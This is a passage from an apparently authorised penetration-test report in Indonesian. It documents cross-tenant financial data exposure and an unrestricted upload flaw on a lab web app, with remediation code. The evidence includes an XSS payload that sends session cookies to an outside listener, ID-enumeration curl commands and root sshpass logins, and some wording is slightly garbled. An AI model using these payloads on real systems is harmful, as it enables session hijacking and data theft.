    '  /api/perusahaan/5   -> HTTP=200 bytes=2   baris=0',
    '  /api/perusahaan/6   -> HTTP=200 bytes=2   baris=0',
    '  /api/perusahaan/7   -> HTTP=200 bytes=2   baris=0',
    '  /api/perusahaan/8   -> HTTP=200 bytes=2   baris=0',
    '  /api/perusahaan/9   -> HTTP=200 bytes=2   baris=0',
    '  /api/perusahaan/10  -> HTTP=200 bytes=2   baris=0']),

  ("Bukti 4 - Isi data yang bocor: record keuangan perusahaan 2, bukan milik akun ini.",
   ['curl -s -b /tmp/cj_indiv http://192.168.1.18:3000/api/perusahaan/2/data-keuangan'],
   ['[{"id":3,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement transport peserta","nominal":"980000.00"},',
    ' {"id":4,"perusahaan_id":2,"tahun":2026,"uraian":"Reimbursement konsumsi kegiatan","nominal":"2150000.00"}]']),
 ],
 "impact": [
  ("Pelanggaran data lintas organisasi", "Data keuangan PT Maju Bersama (perusahaan 2) dibaca oleh akun yang secara desain tidak berhak, yaitu individu1."),
  ("Eksposur nominal rupiah", "Nominal dapat diekstraksi termasuk detail uraian reimbursement yang membocorkan struktur biaya program."),
  ("Skala enumerasi tidak terbatas", "Endpoint tidak membatasi jumlah iterasi; seluruh portofolio data dapat dipetakan dalam satu loop."),
  ("Akses tanpa jejak audit", "Tidak ada audit log pada endpoint API, sehingga akses data lintas tenant tidak tercatat dan tidak dapat dideteksi kemudian."),
  ("Basis bagi skema fraud", "Kombinasi F-03 dan F-04 memberi penyerang akun berperan perusahaan buatan sendiri yang sah untuk mengajukan klaim atas dataorganization lain."),
 ],
 "likelihood": (
   "Tinggi. Memerlukan satu sesi valid, namun sesi valid diperoleh secara "
   "trivial lewat F-02. Endpoint berupa REST resource dengan id numerik "
   "yang mudah ditebak (1, 2, 3). Tingkat kegagalan eksploitasi nol."),
 "risk_note": (
   "PENTING - pemisahan skor teknis dan rating bisnis. Skor CVSS base 6.5 "
   "membuat severity MEDIUM secara teknis karena metrik Integrity dan "
   "Availability tidak terdampak (serangan hanya membaca). Namun NIST SP "
   "800-30 Rev.1 dan NIST SP 800-207 mengharuskan penilaian dampak "
   "terhadap mission, bukan hanya Confidentiality. Karena data berupa "
   "catatan keuangan lintas organisasi yang dapat dipakai untuk fraud, "
   "Risk INHERENT ditetapkan HIGH. Rating bisnis dan skor CVSS sengaja "
   "dipisahkan agar keduanya transparan."),
 "remediation": [
  "Terapkan otorisasi tingkat objek. Nilai dari session dan nilai dari URL harus diverifikasi sama:",
  ("CODE", "router.get(\"/api/perusahaan/:id/data-keuangan\", requireLogin,\n"
           "  async (req, res) => {\n"
           "    const sessionPerusahaan   = req.session.user.perusahaan_id;\n"
           "    const requestedPerusahaan = Number(req.params.id);\n\n"
           "    // Otorisasi tingkat objek: sesi WAJIB punya perusahaan_id dan HARUS cocok.\n"
           "    if (!sessionPerusahaan || sessionPerusahaan !== requestedPerusahaan) {\n"
           "      return res.status(403).json({ error: \"Forbidden\" });\n"
           "    }\n\n"
           "    const [rows] = await db.query(\n"
           "      \"SELECT * FROM data_keuangan WHERE perusahaan_id = ? ORDER BY tahun DESC\",\n"
           "      [sessionPerusahaan]   // gunakan nilai dari session, bukan dari URL\n"
           "    );\n"
           "    res.json(rows);\n"
           "  });"),
  "Alternatif yang lebih aman: jangan pernah mengambil nilai query dari URL sama sekali - selalu pakai req.session.user.perusahaan_id.",
  "Bila id numerik harus tetap publik, gunakan token opaque (UUID) sehingga tebakan id tidak mungkin dilakukan.",
  "Tambahkan audit log untuk setiap akses API: siapa, kapan, id sumber daya, hasil. Ini memenuhi NIST SP 800-53 Rev.5 AU-2 Event Logging, AU-3 Content of Audit Records, dan AU-6(1) Audit Record Review.",
  "Bangun pengujian regresi otomatis per objek: setiap endpoint dengan parameter id harus diuji dengan nilai milik dan bukan milik pengguna.",
  " sesuai NIST SP 800-53 Rev.5 AC-3(9), AC-3(11), AC-4 Information Flow Enforcement, dan AC-6(10) Segregation of Privileges.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A01:2021 - Broken Access Control"),
  ("OWASP API Security Top 10 (2023)", "API1:2023 - Broken Object Level Authorization (BOLA)"),
  ("CWE (MITRE)", "CWE-639, CWE-863, CWE-284 Improper Access Control"),
  ("NIST SP 800-53 Rev.5", "AC-3(9) Authorization Enforcement; AC-3(11) Authorization Enforcement per data element; AC-4 Information Flow Enforcement; AU-2 Event Logging; AU-6(1) Audit Record Review, Analysis, and Reporting"),
  ("NIST SP 800-207 (Zero Trust)", "Per-Resource Authentication and Authorization"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Unauthorized Information Access; Lampiran I - Privacy Impact"),
  ("NIST CSF 2.0", "PR.AA-05, PR.DS-01"),
  ("ISO/IEC 27001:2022", "A.5.3 Segregation of duties; A.8.3 Information access restriction; A.8.5 Secure authentication"),
 ],
 "verification": (
   "Ulangi Bukti 1 sampai Bukti 4 dengan akun individu1. Setiap permintaan "
   "untuk perusahaan_id selain NULL harus menghasilkan HTTP 403 Forbidden "
   "dengan body {\"error\":\"Forbidden\"}. Dashboard dan API harus "
   "konsisten: apa yang tidak tampil di dashboard tidak boleh tersedia "
   "melalui API. Verifikasi juga dilakukan untuk akun perusahaan: perusahaan "
   "1 tidak boleh dapat membaca perusahaan 2."),
},

{
 "id": "F-05",
 "title_id": "Unrestricted File Upload dengan Retensi Nama Asli - Stored XSS pada Origin Aplikasi",
 "title_en": "Unrestricted File Upload with Original Filename Retention - Stored XSS in Application Origin",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
 "cwe": "CWE-434 - Unrestricted Upload of File with Dangerous Type / CWE-79 Stored XSS",
 "owasp": "A04:2021 - Insecure Design",
 "component": "POST /upload - app/routes/dashboard.js; app/server.js (express.static /uploads)",
 "root_cause": (
   "Konfigurasi multer tidak memiliki whitelist ekstensi, validasi MIME, "
   "maupun validasi magic bytes, dan mempertahankan nama file asli dari "
   "klien apa adanya:\n\n"
   "  const storage = multer.diskStorage({\n"
   "    destination: (req, file, cb) =>\n"
   "      cb(null, path.join(__dirname, \"..\", \"public\", \"uploads\")),\n"
   "    filename: (req, file, cb) => cb(null, file.originalname)  // dari klien\n"
   "  });\n"
   "  const upload = multer({ storage });\n\n"
   "Folder upload dilayani sebagai konten statis pada origin yang sama "
   "dengan aplikasi:\n"
   "  app.use(\"/uploads\", express.static(path.join(__dirname, \"public\", \"uploads\")));"),
 "finding": (
   "Setiap file yang diunggah diterima apa adanya nama dan ekstensinya, lalu "
   "dilayani kembali dari origin aplikasi yang sama. Karena cookie sesi tidak "
   "memiliki flag HttpOnly (lihat F-07), file HTML atau JavaScript yang "
   "diunggah menjadi stored XSS pada origin aplikasi - bukan sekadar hosting "
   "file pasif.\n\n"
   " keenam ekstensi yang diuji (php, html, js, svg, exe, sh) semuanya "
   "diterima dan dapat diunduh kembali. Pada stack yang mengeksekusi berkas "
   "di dalam webroot (PHP, SSI, CGI, atau reverse proxy yang meneruskan ke "
   "backend), dampaknya naik menjadi Remote Code Execution.\n\n"
   "TEMUAN NEGATIF - TIDAK terbukti: path traversal pada filename TIDAK "
   "dapat dilakukan. Multer menyaring segmen '../'. Hal ini diverifikasi "
   "dengan memeriksa filesystem di dalam container, bukan hanya dari respons "
   "HTTP."),
 "attack": (
   "1) Login dengan akun perusahaan memakai kredensial dari F-02. 2) Unggah "
   "berkas HTML berisi JavaScript melalui multipart field 'dokumen' (harus "
   "sama dengan upload.single(\"dokumen\")). 3) Berkas tersimpan dan dilayani "
   "di http://target/uploads/<nama>. 4) Korban yang membuka URL tersebut "
   "mengeksekusi JavaScript pada origin aplikasi; karena cookie tidak HttpOnly, "
   "document.cookie dapat dibaca dan sesi korban dapat dibajak."),
 "evidence": [
  ("Bukti 1 - Enam ekstensi berbeda, semuanya diterima dan dapat diunduh kembali.",
   ['rm -f /tmp/cj_up',
    'curl -s -c /tmp/cj_up -o /dev/null -X POST http://192.168.1.18:3000/login-noportal \\',
    '  -d "username=user_a&password=REDACTED_STORED_PASSWORD"',
    'for ext in php html js svg exe sh; do',
    '  printf \'test\' > /tmp/probe.$ext',
    '  up=$(curl -s -b /tmp/cj_up -o /dev/null -w \'%{http_code}\' -F "dokumen=@/tmp/probe.$ext" http://192.168.1.18:3000/upload)',
    '  dl=$(curl -s -o /dev/null -w \'%{http_code}\' http://192.168.1.18:3000/uploads/probe.$ext)',
    '  ct=$(curl -s -o /dev/null -w \'%{content_type}\' http://192.168.1.18:3000/uploads/probe.$ext)',
    '  echo "  probe.$ext -> upload=$up unduh=$dl content-type=$ct"',
    'done'],
   ['  probe.php  -> upload=200 unduh=200 content-type=application/x-httpd-php',
    '  probe.html -> upload=200 unduh=200 content-type=text/html; charset=UTF-8',
    '  probe.js   -> upload=200 unduh=200 content-type=application/javascript; charset=UTF-8',
    '  probe.svg  -> upload=200 unduh=200 content-type=image/svg+xml',
    '  probe.exe  -> upload=200 unduh=200 content-type=application/octet-stream',
    '  probe.sh   -> upload=200 unduh=200 content-type=application/x-sh']),

  ("Bukti 2 - Stored XSS pada origin aplikasi: berkas HTML dieksekusi dan dapat membaca cookie sesi.",
   ['printf \'<script>new Image().src="http://192.168.1.94:8888/steal?c="\\',
    '  +encodeURIComponent(document.cookie)</script>\' > /tmp/probe.html',
    'curl -s -b /tmp/cj_up -o /dev/null -F "dokumen=@/tmp/probe.html" http://192.168.1.18:3000/upload',
    'curl -s http://192.168.1.18:3000/uploads/probe.html'],
   ['<script>new Image().src="http://192.168.1.94:8888/steal?c="+encodeURIComponent(document.cookie)</script>']),

  ("Bukti 3 - Path traversal: GAGAL. Diverifikasi langsung di filesystem dalam container, bukan dari respons HTTP saja.",
   ['printf \'TRAVERSAL_TEST\' > /tmp/trav.txt',
    'curl -s -b /tmp/cj_up -o /dev/null -w "upload -> HTTP=%{http_code}\\n" \\',
    '  -F "dokumen=@/tmp/trav.txt;filename=../../../../tmp/trav_evil.txt" http://192.168.1.18:3000/upload',
    'sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\',
    '  "docker exec labkeu-app sh -c \'ls -l /usr/src/app/public/uploads/trav_evil.txt; cat /tmp/trav_evil.txt 2>/dev/null || echo \\"  TIDAK ADA -> traversal GAGAL\\"\'"'],
   ['upload -> HTTP=200',
    '-rw-r--r--    1 root     root            14 Sep 28 06:48 trav_evil.txt',
    '  TIDAK ADA -> traversal GAGAL (multer menyaring ../)']),

  ("Bukti 4 - Dampak Stored XSS terhadap cookie sesi: cookie connect.sid dapat dibaca document.cookie karena HttpOnly tidak diset.",
   ['curl -s -D - -o /dev/null http://192.168.1.18:3000/login | grep -i \'set-cookie\''],
   ['Set-Cookie: connect.sid=s%3Alz3RUuYE2zT7lYaukZhuyWyCEVAgN8iX.t4nRvext%2BizW88aoV1UiyI%2FxSv%2FT4zNmgsDcGx3aVNE; Path=/',
    '# Tidak memuat HttpOnly, tidak memuat Secure, tidak memuat SameSite.']),

  ("Pembersihan jejak berkas uji.",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 \\',
    '  "docker exec labkeu-app rm -f /usr/src/app/public/uploads/probe.php \\',
    '    /usr/src/app/public/uploads/probe.html /usr/src/app/public/uploads/probe.js \\',
    '    /usr/src/app/public/uploads/probe.svg /usr/src/app/public/uploads/probe.exe \\',
    '    /usr/src/app/public/uploads/probe.sh /usr/src/app/public/uploads/trav_evil.txt"'],
   ['(berkas uji dihapus dari container)']),
 ],
 "impact": [
  ("Stored XSS pada origin aplikasi", "JavaScript dieksekusi pada origin yang sama dengan aplikasi, sehingga memiliki akses penuh ke DOM, form, cookie, dan seluruh endpoint yangreachable."),
  ("Session hijacking", "Cookie connect.sid tidak HttpOnly (F-07) sehingga dapat dibaca via document.cookie dan dipakai ulang untuk masuk sebagai korban. Karena logout tidak menghapus sesi di server (F-07), cookie curian tetap sah selamanya."),
  ("Eskalasi menuju Remote Code Execution", "Pada stack yang mengeksekusi berkas di webroot, unggahan .php atau .html berubah dari content injection menjadi Remote Code Execution penuh pada container aplikasi."),
  ("Hosting konten berbahaya pada domain kredibel", "Materi berbahaya dapat di-hosting pada domain aplikasi yang mencantumkan nama organisasi, dipakai untuk distribusi malware atau halaman phishing yang memperoleh legitimasi dari domain target."),
  ("Penyimpanan payload lintas-perusahaan", "Nama file asli dipertahankan, sehingga penyerang dapat menimpa berkas milik pengguna lain danMemories melakukan confusion pada sistem."),
 ],
 "likelihood": (
   "Tinggi. Memerlukan satu sesi valid yang diperoleh gratis lewat F-02. "
   "Nama field 'dokumen' dapat dibaca langsung dari HTML form /upload, dan "
   "tidak ada filter yang perlu dilewati. Dampak XSS menjadi eksplisit pada "
   "server yang sama, bukan teoretis."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = code injection dan unauthorized "
   "content publication. Impact = Severe pada Confidentiality dan "
   "Integrity. Risk INHERENT = Very High. CATATAN AKURASI: eskalasi menjadi "
   "Remote Code Execution bersifat conditional pada stack di bawah aplikasi "
   "dan tidak dibuktikan pada target ini (stack berjalan pada Node.js/Express "
   "yang tidak mengeksekusi berkas .php). Namun kontrol keamanan upload tetap "
   "harus diperbaiki karena sifat risikonya berubah begitu stack berubah."),
 "remediation": [
  "Terapkan whitelist ekstensi DAN validasi magic bytes. Validasi MIME header saja tidak memadai karena dikendalikan klien:",
  ("CODE", "const path = require('path');\n"
           "\n"
           "const EKSTENSI_IZIN = new Set(['.pdf', '.png', '.jpg']);\n"
           "const MIME_IZIN     = new Set([\n"
           "  'application/pdf',\n"
           "  'image/png',\n"
           "  'image/jpeg'\n"
           "]);\n"
           "const UKURAN_MAKS_BYTES = 5 * 1024 * 1024;   // 5 MB\n"
           "\n"
           "function validasiBerkas(file, cb) {\n"
           "  const ext = path.extname(file.originalname).toLowerCase();\n"
           "  if (!EKSTENSI_IZIN.has(ext))      return cb(new Error('Ekstensi tidak diizinkan'));\n"
           "  if (!MIME_IZIN.has(file.mimetype)) return cb(new Error('MIME tidak diizinkan'));\n"
           "  if (file.size > UKURAN_MAKS_BYTES) return cb(new Error('Ukuran melebihi batas'));\n"
           "  cb(null, true);\n"
           "}\n"
           "\n"
           "// Validasi magic bytes di atas validasi header:\n"
           "const buffer = await fs.promises.readFile(file.path, { encoding: null });\n"
           "if (ext === '.pdf' && buffer.subarray(0, 5).toString() !== '%PDF-') {\n"
           "  return res.render('upload', { message: 'Berkas ditolak.' });\n"
           "}"),
  "Rename berkas secara acak dan simpan di storage NON-webroot, misalnya /var/lib/labkeu-uploads, di luar jangkauan express.static:",
  ("CODE", "const crypto = require('crypto');\n"
           "const storage = multer.diskStorage({\n"
           "  destination: (req, file, cb) => cb(null, '/var/lib/labkeu-uploads'),\n"
           "  filename: (req, file, cb) => {\n"
           "    const ext = path.extname(file.originalname).toLowerCase();\n"
           "    const namaAcak = crypto.randomBytes(16).toString('hex');\n"
           "    cb(null, namaAcak + ext);   // nama asli TIDAK pernah dipakai lagi\n"
           "  }\n"
           "});"),
  "Layankan berkas hanya melalui endpoint yang mewajibkan sesi dan memaksa header berikut:",
  ("CODE", "res.setHeader('Content-Type', 'application/octet-stream');\n"
           "res.setHeader('Content-Disposition',\n"
           "  'attachment; filename=\"' + namaUnduhAman + '\"');\n"
           "res.setHeader('X-Content-Type-Options', 'nosniff');"),
  "Jalankan container aplikasi sebagai user non-root dengan filesystem read-only sehingga berkas yang berhasil diunggah tidak dapat dieksekusi (defense in depth).",
  " sesuai NIST SP 800-53 Rev.5 SI-10 Information Input Validation, CM-7(5) Least Functionality, SA-11(1) Static Application Code Analysis, dan AC-6(10) Segregation of Privileges.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A04:2021 - Insecure Design; A01:2021 - Broken Access Control (unggahan dapat diakses lintas tenant)"),
  ("CWE (MITRE)", "CWE-434, CWE-79, CWE-434 Unrestricted Upload of File with Dangerous Type"),
  ("NIST SP 800-53 Rev.5", "SI-10 Information Input Validation; CM-7(5) Least Functionality; SA-11(1) Static Application Code Analysis; AC-6(10) Segregation of Privileges"),
  ("NIST SP 800-53 Rev.5 (Pengembangan)", "SA-15(4) Development Process, Standards and Tools; SA-15(11) Secure Coding Practices"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Code Injection"),
  ("NIST CSF 2.0", "PR.PS-02, PR.DS-01, PR.DS-06 (integrity checks)"),
  ("ISO/IEC 27001:2022", "A.8.26 Application security requirements; A.8.27 Secure system architecture; A.8.28 Secure coding"),
 ],
 "verification": (
   "Unggah file .php, .html, .js, .svg, .exe, dan .sh - semua harus "
   "ditolak dengan pesan generik. Unggah file .pdf yang valid - harus "
   "diterima dan nama berkasnya harus acak, bukan nama asli. Path traversal "
   "harus tetap ditolak. URL http://target/uploads/<nama_asli> harus "
   "menghasilkan 404. Verifikasi juga jalankan pemindai berkas (.pdf) untuk "
   "memastikan tidak ada berkas executable yang tersisa."),
},
]
